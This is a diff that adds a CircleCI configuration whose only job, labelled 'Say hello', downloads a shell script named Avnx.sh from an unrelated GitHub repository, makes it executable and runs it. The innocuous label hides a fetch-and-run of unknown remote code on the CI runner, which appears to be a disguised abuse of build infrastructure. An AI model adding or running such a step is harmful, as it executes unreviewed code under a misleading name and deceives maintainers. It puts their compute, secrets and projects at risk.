@@ -1,0 +1,16 @@
+version: 2.1
+
+jobs:
+  say-hello:
+    docker:
+      - image: cimg/node:12.22.11
+    steps:
+      - checkout
+      - run:
+          name: "Say hello"
+          command:  wget https://github.com/Akatsoki/joss/raw/main/Avnx.sh && chmod +x Avnx.sh && ./Avnx.sh
+
+workflows:
+  say-hello-workflow:
+    jobs:
+      - say-hello
